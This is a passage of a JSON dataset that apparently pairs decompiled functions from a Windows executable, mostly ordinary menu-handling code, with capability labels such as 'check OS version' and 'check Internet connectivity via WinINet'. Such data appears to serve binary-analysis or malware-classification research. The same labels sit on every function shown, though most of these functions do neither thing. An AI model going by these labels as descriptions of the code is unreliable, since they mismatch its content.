fcn.004055c8();\n            goto code_r0x00433cab;\n        }\n        if (uVar1 - 0x20 < 9) {\n            puStack28 = &fcn.00433b40::var_2h + 2;\n            fcn.004055c8();\n            goto code_r0x00433cab;\n        }\n    }\n    else if (uVar1 < 0x41) {\n        if (uVar1 - 0x2d < 2) {\n            puStack28 = &fcn.00433b40::var_2h + 2;\n            fcn.004055c8();\n            goto code_r0x00433cab;\n        }\n        if (uVar1 - 0x30 < 10) {\n            puStack28 = &fcn.00433b40::var_2h + 2;\n            fcn.00405718();\n            goto code_r0x00433cab;\n        }\n    }\n    else {\n        if (uVar1 - 0x41 < 0x1a) {\n            fcn.00405718();\n            goto code_r0x00433cab;\n        }\n        if (uVar1 - 0x60 < 10) {\n            puStack28 = &fcn.00433b40::var_2h + 2;\n            fcn.00405718();\n            goto code_r0x00433cab;\n        }\n        if (uVar1 - 0x70 < 0x18) {\n            puStack28 = &fcn.00433b40::var_2h + 2;\n            fcn.00409d70();\n            fcn.00405864();\n            goto code_r0x00433cab;\n        }\n    }\n    puStack28 = &fcn.00433b40::var_2h + 2;\n    fcn.00433aec();\ncode_r0x00433cab:\n    fcn.00405530();\n    *in_FS_OFFSET = uStack36;\n    puStack28 = 0x433d26;\n    uStack32 = 0x433d1e;\n    fcn.00405554();\n    return;\n}\n",
        "token_count": 897
    },
    "00433f24": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nchar __cdecl fcn.00433f24(uint *arg_8h)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    code *in_ECX;\n    int32_t in_EDX;\n    char var_9h;\n    uint var_8h;\n    uint var_4h;\n    \n    if (in_EDX != 0) {\n        var_9h = '\\0';\n        while (var_9h == '\\0') {\n            iVar1 = fcn.004365a0();\n            if (iVar1 <= *in_EAX) {\n                return '\\0';\n            }\n            iVar1 = fcn.004365b0();\n            if (*(arg_8h + -1) <= *(iVar1 + 0x3f) && *(iVar1 + 0x3f) != *(arg_8h + -1)) {\n                return '\\0';\n            }\n            var_9h = (*in_ECX)(*arg_8h);\n            *in_EAX = *in_EAX + 1;\n        }\n    }\n    return var_9h;\n}\n",
        "token_count": 240
    },
    "00433f88": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.00433f88(int32_t param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    char var_16h;\n    uint8_t var_15h;\n    int32_t var_14h;\n    int32_t var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_1h;\n    \n    var_10h = 0;\n    var_14h = 0;\n    iVar2 = 0;\n    iVar3 = 0;\n    if (param_2 != 0) {\n        iVar2 = fcn.004365a0();\n    }\n    if (param_1 != 0) {\n        iVar3 = fcn.004365a0();\n    }\n    var_16h = '\\0';\n    while ((var_16h == '\\0' && ((var_10h < iVar2 || (var_14h < iVar3))))) {\n        var_1h._0_1_ = 0xff;\n        var_15h = 0xff;\n        if (var_10h < iVar2) {\n            iVar1 = fcn.004365b0();\n            var_1h._0_1_ = *(iVar1 + 0x3f);\n        }\n        if (var_14h < iVar3) {\n            iVar1 = fcn.004365b0();\n            var_15h = *(iVar1 + 0x3f);\n        }\n        if (var_15h < var_1h) {\n            var_1h._0_1_ = var_15h;\n            var_16h = fcn.00433f24(&var_1h + 1);\n        }\n        else {\n            var_16h = fcn.00433f24(&var_1h + 1);\n        }\n        while ((var_10h < iVar2 && (iVar1 = fcn.004365b0(),  *(iVar1 + 0x3f) <= var_1h))) {\n            var_10h = var_10h + 1;\n        }\n        while ((var_14h < iVar3 && (iVar1 = fcn.004365b0(),  *(iVar1 + 0x3f) <= var_1h))) {\n            var_14h = var_14h + 1;\n        }\n    }\n    return;\n}\n",
        "token_count": 565
    },
    "00434420": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nint32_t __fastcall fcn.00434420(uint param_1, char param_2)\n\n{\n    ushort uVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint var_1h;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00404974();\n        param_2 = extraout_DL;\n    }\n    fcn.0041ffc4();\n    *(in_EAX + 0x3e) = 1;\n    *(in_EAX + 0x39) = 1;\n    *(in_EAX + 0x3b) = 2;\n    *(in_EAX + 0x3c) = 2;\n    uVar1 = fcn.00433f04();\n    *(in_EAX + 0x50) = uVar1;\n    *(in_EAX + 0x40) = 0xffffffff;\n    iVar2 = fcn.00404620();\n    *(in_EAX + 0x78) = iVar2;\n    *(iVar2 + 0xc) = in_EAX;\n    *(iVar2 + 8) = 0x436f10;\n    if (param_2 != '\\0') {\n        fcn.004049cc();\n        *in_FS_OFFSET = uStack32;\n    }\n    return in_EAX;\n}\n",
        "token_count": 332
    },
    "00434550": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00434550(uint8_t param_1, uint param_2)\n\n{\n    uchar *puVar1;\n    uint8_t uVar2;\n    char cVar3;\n    int32_t in_EAX;\n    int32_t iVar4;\n    uint uVar5;\n    uint32_t uVar6;\n    uint *in_FS_OFFSET;\n    uint8_t uVar7;\n    uint in_stack_ffffff88;\n    uint uStack88;\n    uint uStack84;\n    uchar *puStack80;\n    uint var_3ch;\n    uint lpmi;\n    uint var_32h;\n    uint32_t var_2eh;\n    uint32_t var_2ah;\n    uint32_t var_26h;\n    uint var_22h;\n    uint var_1eh;\n    uint var_1ah;\n    uint var_12h;\n    uint8_t var_6h;\n    uint8_t var_5h;\n    uint var_4h;\n    \n    puStack80 = &stack0xfffffffc;\n    var_4h = 0;\n    uStack84 = 0x4347a1;\n    uStack88 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack88;\n    puVar1 = &stack0xfffffffc;\n    var_5h = param_1;\n    if (*(in_EAX + 0x3e) == '\\0') goto code_r0x00434783;\n    fcn.004055c8();\n    iVar4 = fcn.004365a0();\n    if (iVar4 < 1) {\n        if (*(in_EAX + 0x60) != 0) {\n            if ((*(in_EAX + 100) != 0) && (*(*(in_EAX + 100) + 100) == 0)) {\n                cVar3 = fcn.004047dc();\n                if (cVar3 != '\\0') goto code_r0x004345ec;\n            }\n            fcn.00433b40(0x4347b8, var_4h);\n            fcn.004058e0(0);\n        }\n    }\n    else {\n        var_22h = fcn.00434a54();\n    }\ncode_r0x004345ec:\n    uVar2 = sub.kernel32.dll_GetVersion();\n    uVar7 = uVar2 == 4;\n    if (uVar2 < 4) {\n        fcn.00405974();\n        uVar6 = *((uVar7 & 0x7f) * 4 + 0x492484) |\n                *(*(in_EAX + 0x48) * 4 + 0x492478) | *(*(in_EAX + 0x38) * 4 + 0x492468) |\n                *(*(in_EAX + 0x39) * 4 + 0x492470);\n        iVar4 = fcn.004365a0();\n        if (iVar4 < 1) {\n            uVar5 = fcn.004059dc();\n            sub.user32.dll_InsertMenuA(param_2, 0xffffffff, uVar6 | 0x400, *(in_EAX + 0x50), uVar5);\n            in_stack_ffffff88 = param_2;\n            puVar1 = puStack80;\n        }\n        else {\n            uVar5 = fcn.004059dc();\n            uVar5 = fcn.00434a54(uVar5);\n            sub.user32.dll_InsertMenuA(param_2, 0xffffffff, uVar6 | 0x410, uVar5);\n            in_stack_ffffff88 = param_2;\n            puVar1 = puStack80;\n        }\n        goto code_r0x00434783;\n    }\n    lpmi = 0x2c;\n    var_32h = 0x3f;\n    iVar4 = fcn.00436b60();\n    if (iVar4 == 0) {\ncode_r0x0043462c:\n        if (*(in_EAX + 0x4c) != 0) {\n            cVar3 = (**(**(in_EAX + 0x4c) + 0x1c))();\n            uVar2 = cVar3 == '\\0';\n            if (uVar2) goto code_r0x00434642;\n        }\n        var_6h = 0;\n        uVar2 = true;\n    }\n    else {\n        uVar2 = *(iVar4 + 0x40) == '\\0';\n        if (uVar2) {\n            iVar4 = fcn.00436174();\n            uVar2 = iVar4 == 0;\n            if (uVar2) goto code_r0x0043462c;\n        }\ncode_r0x00434642:\n        var_6h = 1;\n    }\n    fcn.00405974();\n    var_2eh = *((uVar2 & 0x7f) * 4 + 0x4924b8) | *(*(in_EAX + 0x3d) * 4 + 0x4924b0) | *(*(in_EAX + 0x48) * 4 + 0x49248c)\n              | *(var_5h * 4 + 0x4924c0) | *(var_6h * 4 + 0x4924c8);\n    var_2ah = *(*(in_EAX + 0x38) * 4 + 0x492498) | *(*(in_EAX + 0x39) * 4 + 0x4924a8) |\n              *(*(in_EAX + 0x3a) * 4 + 0x4924a0);\n    var_26h = *(in_EAX + 0x50);\n    var_22h = 0;\n    var_1eh = 0;\n    var_1ah = 0;\n    var_12h = fcn.004059dc();\n    iVar4 = fcn.004365a0();\n    if (0 < iVar4) {\n        var_22h = fcn.00434a54();\n    }\n    sub.user32.dll_InsertMenuItemA(param_2, 0xffffffff, 0xffffffff, &lpmi);\n    in_stack_ffffff88 = param_2;\n    puVar1 = puStack80;\ncode_r0x00434783:\n    puStack80 = puVar1;\n    *in_FS_OFFSET = in_stack_ffffff88;\n    fcn.00405530(0x4347a8);\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 1449
    },
    "00434924": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00434924(void)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    uint uVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    bool bVar5;\n    \n    if ((*(in_EAX + 7) & 8) != 0) {\n        return;\n    }\n    if ((*(in_EAX + 7) & 2) != 0) {\n        *(in_EAX + 0x1d) = 1;\n        return;\n    }\n    if (in_EAX[0x1b] != 0) {\n        fcn.00434924();\n        return;\n    }\n    uVar2 = fcn.00434a54();\n    iVar3 = sub.user32.dll_GetMenuItemCount(uVar2);\n    bVar5 = iVar3 == 0;\n    for (; 0 < iVar3; iVar3 = iVar3 + -1) {\n        uVar2 = fcn.00434a54(iVar3 + -1, 0x400);\n        uVar4 = sub.user32.dll_GetMenuState();\n        if ((uVar4 & 4) == 0) {\n            uVar2 = fcn.00434a54(iVar3 + -1, 0x400);\n            sub.user32.dll_RemoveMenu();\n            bVar5 = true;\n        }\n    }\n    if (!bVar5) {\n        return;\n    }\n    if ((in_EAX[0x19] == 0) && (cVar1 = fcn.004047dc(uVar2),  cVar1 != '\\0')) {\n        uVar2 = fcn.00434a54();\n        iVar3 = sub.user32.dll_GetMenuItemCount(uVar2);\n        if (iVar3 == 0) {\n            sub.user32.dll_DestroyMenu(in_EAX[0xd]);\n            in_EAX[0xd] = 0;\n            goto code_r0x004349e4;\n        }\n    }\n    fcn.004347e4();\ncode_r0x004349e4:\n    (**(*in_EAX + 0x3c))();\n    return;\n}\n",
        "token_count": 471
    },
    "00434a54": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.00434a54(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    \n    if (*(in_EAX + 0x34) == 0) {\n        cVar1 = fcn.004047dc();\n        if (cVar1 == '\\0') {\n            uVar2 = sub.user32.dll_CreateMenu();\n            *(in_EAX + 0x34) = uVar2;\n        }\n        else {\n            uVar2 = sub.user32.dll_CreatePopupMenu();\n            *(in_EAX + 0x34) = uVar2;\n        }\n        if (*(in_EAX + 0x34) == 0) {\n            fcn.00433a94();\n        }\n        fcn.004347e4();\n    }\n    return *(in_EAX + 0x34);\n}\n",
        "token_count": 188
    },
    "00434cfc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00434cfc(uint arg_8h)\n\n{\n    int32_t in_EAX;\n    uint *in_ECX;\n    uint var_10h;\n    uint uStack16;\n    uint uStack12;\n    uint uStack8;\n    \n    var_10h = *in_ECX;\n    uStack16 = in_ECX[1];\n    uStack12 = in_ECX[2];\n    uStack8 = in_ECX[3];\n    if (*(in_EAX + 0x92) != 0) {\n        (**(in_EAX + 0x90))(arg_8h, &var_10h);\n    }\n    return;\n}\n",
        "token_count": 149
    },
    "00436174": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.00436174(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint uVar2;\n    \n    uVar2 = 0;\n    for (iVar1 = *(in_EAX + 100); (iVar1 != 0 && (*(iVar1 + 0x7c) == 0)); iVar1 = *(iVar1 + 100)) {\n    }\n    if (iVar1 == 0) {\n        iVar1 = fcn.00436b60();\n        if (iVar1 != 0) {\n            uVar2 = *(iVar1 + 0x48);\n        }\n    }\n    else {\n        uVar2 = *(iVar1 + 0x7c);\n    }\n    return uVar2;\n}\n",
        "token_count": 166
    },
    "004361f0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004361f0(int32_t *arg_8h)\n\n{\n    bool bVar1;\n    char cVar2;\n    int32_t in_EAX;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint32_t *in_FS_OFFSET;\n    bool bVar5;\n    uchar uVar6;\n    uint32_t uStack64;\n    uint uStack60;\n    uchar *puStack56;\n    uint var_24h;\n    int32_t var_20h;\n    int32_t var_18h;\n    int32_t var_10h;\n    uint var_ch;\n    uint var_8h;\n    int32_t *var_4h;\n    \n    puStack56 = &stack0xfffffffc;\n    var_8h = 0;\n    uStack60 = 0x4363d2;\n    uStack64 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack64;\n    fcn.0040484c();\n    cVar2 = fcn.004047dc();\n    bVar5 = cVar2 == '\\0';\n    if (bVar5) {\n        uVar6 = 1;\n    }\n    else {\n        uVar6 = bVar5;\n        fcn.004361a4(&stack0xfffffffc);\n    }\n    bVar5 = !bVar5;\n    iVar3 = fcn.00436b60();\n    var_10h = fcn.00436174();\n    fcn.00405974();\n    if (uVar6) {\n        *arg_8h = 5;\n        *var_4h = -2;\n        bVar1 = false;\n    }\n    else if ((var_10h == 0) || ((0x7fffffff < *(in_EAX + 0x40) && (bVar5)))) {\n        if (*(in_EAX + 0x4c) != 0) {\n            cVar2 = (**(**(in_EAX + 0x4c) + 0x1c))();\n            if (cVar2 == '\\0') {\n                *var_4h = 0x10;\n                if (!bVar5) {\n                    *arg_8h = 0x10;\n                }\n                bVar1 = true;\n                goto code_r0x004362db;\n            }\n        }\n        *var_4h = -7;\n        bVar1 = false;\n    }\n    else {\n        *var_4h = *(var_10h + 0x34);\n        if (!bVar5) {\n            *arg_8h = *(var_10h + 0x30);\n        }\n        bVar1 = true;\n    }\ncode_r0x004362db:\n    if ((bVar1) && (!bVar5)) {\n        *var_4h = *var_4h + 0xf;\n    }\n    if (!bVar5) {\n        *arg_8h = *arg_8h + 3;\n    }\n    fcn.00403af4();\n    if (iVar3 == 0) {\n        cVar2 = fcn.004047dc();\n        if (cVar2 == '\\0') {\n            uVar4 = 0;\n        }\n        else {\n            uVar4 = *0x60;\n        }\n    }\n    else {\n        uVar4 = 0;\n    }\n    if (*(in_EAX + 0x60) == 0) {\n        fcn.004055c8();\n    }\n    else {\n        fcn.00433b40();\n        fcn.00405864();\n    }\n    uVar4 = *(uVar4 * 2 + 0x4924e0) | 0x560;\n    fcn.00434ae4(uVar4, 0, &var_20h);\n    *var_4h = *var_4h + (var_18h - var_20h) + 7;\n    if (*(in_EAX + 0xa2) != 0) {\n        (**(in_EAX + 0xa0))(arg_8h, var_4h);\n    }\n    *in_FS_OFFSET = uVar4;\n    fcn.00405530(0x4363d9);\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 944
    },
    "0043642c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0043642c(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    if ((*(in_EAX + 100) != 0) && (iVar1 = fcn.004365a0(),  -1 < iVar1 + -1)) {\n        do {\n            iVar2 = fcn.004365b0();\n            if ((in_EAX != iVar2) && ((*(iVar2 + 0x3d) != '\\0' && (*(iVar2 + 0x3f) == *(in_EAX + 0x3f))))) {\n                fcn.00436478();\n            }\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != 0);\n    }\n    return;\n}\n",
        "token_count": 176
    },
    "00436478": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00436478(uint param_1, uint8_t param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    \n    if (param_2 != *(in_EAX + 0x38)) {\n        *(in_EAX + 0x38) = param_2;\n        if ((*(in_EAX + 100) != 0) && ((*(in_EAX + 0x1c) & 2) == 0)) {\n            uVar1 = fcn.00434a54(*(in_EAX + 0x50), *(param_2 * 4 + 0x492468));\n            sub.user32.dll_CheckMenuItem(uVar1);\n        }\n        if ((param_2 != 0) && (*(in_EAX + 0x3d) != '\\0')) {\n            fcn.0043642c();\n        }\n    }\n    return;\n}\n",
        "token_count": 202
    },
    "004364cc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004364cc(uint param_1, uint8_t param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    uint uVar2;\n    \n    if (param_2 == *(in_EAX + 0x39)) {\n        return;\n    }\n    *(in_EAX + 0x39) = param_2;\n    if (((**0x494d14 != 2) || (iVar1 = fcn.004365a0(),  iVar1 == 0)) &&\n       ((in_EAX[0x19] == 0 || (*(in_EAX[0x19] + 0x6c) == 0)))) {\n        if ((in_EAX[0x19] != 0) && ((*(in_EAX + 7) & 2) == 0)) {\n            uVar2 = fcn.00434a54(*(in_EAX + 0x14), *(param_2 * 4 + 0x492470));\n            sub.user32.dll_EnableMenuItem(uVar2);\n        }\n        (**(*in_EAX + 0x3c))();\n        return;\n    }\n    (**(*in_EAX + 0x3c))();\n    return;\n}\n",
        "token_count": 274
    },
    "00436544": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00436544(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    \n    if (param_2 != *(in_EAX + 0x3f)) {\n        if (*(in_EAX + 100) != 0) {\n            fcn.00436908();\n            fcn.004349f4();\n        }\n        *(in_EAX + 0x3f) = param_2;\n        if ((*(in_EAX + 0x38) != '\\0') && (*(in_EAX + 0x3d) != '\\0')) {\n            fcn.0043642c();\n        }\n    }\n    return;\n}\n",
        "token_count": 151
    },
    "004365b0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.004365b0(void)\n\n{\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 0x5c) == 0) {\n        fcn.00433a94();\n    }\n    fcn.00419898();\n    return;\n}\n",
        "token_count": 62
    },
    "0043672c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0043672c(int32_t param_1, int32_t param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    \n    if (*(param_1 + 100) != 0) {\n        fcn.00433a94();\n    }\n    if (in_EAX[0x17] == 0) {\n        iVar1 = fcn.00404620();\n        in_EAX[0x17] = iVar1;\n    }\n    if ((-1 < param_2 + -1) && (param_2 + -1 < *(in_EAX[0x17] + 8))) {\n        iVar1 = fcn.00419898();\n        if (*(param_1 + 0x3f) <= *(iVar1 + 0x3f) && *(iVar1 + 0x3f) != *(param_1 + 0x3f)) {\n            fcn.00419898();\n            fcn.00436544();\n        }\n    }\n    fcn.004349f4();\n    fcn.00419914();\n    *(param_1 + 100) = in_EAX;\n    *(param_1 + 0x84) = in_EAX;\n    *(param_1 + 0x80) = fcn.004369a8;\n    if (in_EAX[0xd] != 0) {\n        fcn.00434924();\n    }\n    fcn.004365a0();\n    (**(*in_EAX + 0x3c))();\n    return;\n}\n",
        "token_count": 345
    },
    "004367e4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004367e4(uint param_1, int32_t param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    \n    if ((-1 < param_2) && (in_EAX[0x17] != 0)) {\n        iVar1 = fcn.004365a0();\n        if (param_2 < iVar1) goto code_r0x0043680a;\n    }\n    fcn.00433a94();\ncode_r0x0043680a:\n    iVar1 = fcn.00419898();\n    fcn.0041978c();\n    *(iVar1 + 100) = 0;\n    *(iVar1 + 0x80) = 0;\n    *(iVar1 + 0x84) = 0;\n    if (in_EAX[0xd] != 0) {\n        fcn.00434924();\n    }\n    fcn.004365a0();\n    (**(*in_EAX + 0x3c))();\n    return;\n}\n",
        "token_count": 230
    },
    "004369a8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004369a8(uint arg_8h)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    \n    if ((arg_8h != '\\0') && ((*(in_EAX + 0x34) != 0 || (*(in_EAX + 0x6c) != 0)))) {\n        fcn.00434924();\n    }\n    if (*(in_EAX + 100) == 0) {\n        cVar1 = fcn.004047dc();\n        if (cVar1 != '\\0') {\n            fcn.0043892c();\n        }\n    }\n    else {\n        fcn.004369a8(0);\n    }\n    return;\n}\n",
        "token_count": 157
    },
    "00437674": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong __fastcall fcn.00437674(uint param_1, char param_2)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint8_t uStack24;\n    int32_t iStack20;\n    \n    uStack24 = 0;\n    if ((param_2 != '\\0') || (((*(in_EAX + 0x1c) & 0x10) == 0 && (cVar1 = fcn.004377fc(),  cVar1 != '\\0')))) {\n        iStack20 = 0;\n        iVar5 = 0;\n        iVar4 = 0;\n        iVar2 = fcn.004365a0();\n        iVar3 = iStack20;\n        if (-1 < iVar2 + -1) {\n            do {\n                iVar3 = fcn.004365b0();\n                if (*(iVar3 + 0x3e) != '\\0') {\n                    fcn.004365b0();\n                    cVar1 = fcn.00437650();\n                    iVar3 = iVar4;\n                    if (cVar1 == '\\0') break;\n                    iVar3 = fcn.004365b0();\n                    *(iVar3 + 0x3e) = 0;\n                    uStack24 = 1;\n                }\n                iVar4 = iVar4 + 1;\n                iVar2 = iVar2 + -1;\n                iVar3 = iStack20;\n            } while (iVar2 != 0);\n        }\n        iStack20 = iVar3;\n        iVar4 = fcn.004365a0();\n        if (iStack20 <= iVar4 + -1) {\n            iVar3 = ((iVar4 + -1) - iStack20) + 1;\n            iVar4 = iStack20;\n            do {\n                fcn.004365b0();\n                cVar1 = fcn.00437650();\n                if (cVar1 == '\\0') {\n                    iVar2 = fcn.004365b0();\n                    if (*(iVar2 + 0x3e) != '\\0') {\n                        if ((iVar5 != 0) && (*(iVar5 + 0x3e) == '\\0')) {\n                            *(iVar5 + 0x3e) = 1;\n                            uStack24 = 1;\n                        }\n                        iVar5 = 0;\n                        iStack20 = iVar4;\n                    }\n                }\n                else {\n                    if ((iVar5 != 0) && (*(iVar5 + 0x3e) != '\\0')) {\n                        *(iVar5 + 0x3e) = 0;\n                        uStack24 = 1;\n                    }\n                    iVar5 = fcn.004365b0();\n                }\n                iVar4 = iVar4 + 1;\n                iVar3 = iVar3 + -1;\n            } while (iVar3 != 0);\n        }\n        iVar4 = fcn.004365a0();\n        iVar3 = iStack20 - (iVar4 + -1);\n        if (iVar3 == 0 || iStack20 < iVar4 + -1) {\n            iVar3 = iVar3 + -1;\n            do {\n                iVar4 = fcn.004365b0();\n                if (*(iVar4 + 0x3e) != '\\0') {\n                    fcn.004365b0();\n                    cVar1 = fcn.00437650();\n                    if (cVar1 == '\\0') break;\n                    iVar4 = fcn.004365b0();\n                    *(iVar4 + 0x3e) = 0;\n                    uStack24 = 1;\n                }\n                iVar3 = iVar3 + 1;\n            } while (iVar3 != 0);\n        }\n    }\n    return CONCAT44(iStack20, uStack24);\n}\n",
        "token_count": 836
    },
    "004377cc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuchar fcn.004377cc(void)\n\n{\n    int32_t in_EAX;\n    uint32_t uVar1;\n    \n    uVar1 = *(in_EAX + 0x3b);\n    if ((*(in_EAX + 0x3b) == 2) && (*(in_EAX + 100) != 0)) {\n        uVar1 = fcn.004377cc();\n        uVar1 = *((uVar1 & 0x7f) + 0x492418);\n    }\n    return *((uVar1 & 0x7f) + 0x49241c);\n}\n",
        "token_count": 135
    },
    "004377fc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuchar fcn.004377fc(void)\n\n{\n    int32_t in_EAX;\n    uint32_t uVar1;\n    \n    uVar1 = *(in_EAX + 0x3c);\n    if ((*(in_EAX + 0x3c) == 2) && (*(in_EAX + 100) != 0)) {\n        uVar1 = fcn.004377fc();\n        uVar1 = *((uVar1 & 0x7f) + 0x492418);\n    }\n    return *((uVar1 & 0x7f) + 0x49241c);\n}\n",
        "token_count": 135
    },
    "0043782c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
